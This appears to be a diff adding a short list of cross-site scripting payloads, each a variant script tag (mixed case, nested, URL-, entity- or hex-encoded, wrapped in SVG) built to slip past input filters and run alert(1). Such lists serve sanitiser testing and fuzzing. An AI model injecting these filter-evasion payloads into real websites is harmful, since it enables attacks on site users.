@@ -1,0 +1,7 @@
+<ScRiPt>alert(1)</ScRiPt>
+<<script>alert(1)//<</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+%3Cscript%3Ealert(1)%3C/script%3E
+&#60;script&#62;alert(1)&#60;/script&#62;
+\x3Cscript\x3Ealert(1)\x3C/script\x3E
+<svg><script>alert(1)</script></svg>
